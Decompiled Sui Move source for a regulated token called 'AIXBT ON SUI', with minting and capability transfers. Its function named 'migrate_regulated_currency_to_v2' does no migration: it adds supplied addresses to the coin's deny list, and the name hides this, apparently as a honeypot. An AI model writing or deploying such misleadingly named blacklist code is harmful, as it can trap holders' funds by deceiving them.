module 0x8047600975b0bf3c7dfc291ce7b6521e2f0e8948699ee65c9aebc475a7311b17::AIXBT {
    struct AIXBT has drop {
        dummy_field: bool,
    }

    fun init(arg0: AIXBT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<AIXBT>(arg0, 2, b"AIXBT", b"AIXBT ON SUI", b"AIXBT ON SUI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/cseDTNe4TXkA2CQz9Vg_Bt2Qi0RThccQHsWlRRb-cx8?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AIXBT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<AIXBT>>(v1, @0x7c3c58155b85c3ecf4864777fce255a7e405ffa3b6e443e736976588910f0e8d);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AIXBT>(&mut v3, 100000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AIXBT>>(v3, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<AIXBT>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<AIXBT>(arg0, v1)) {
                0x2::coin::deny_list_add<AIXBT>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

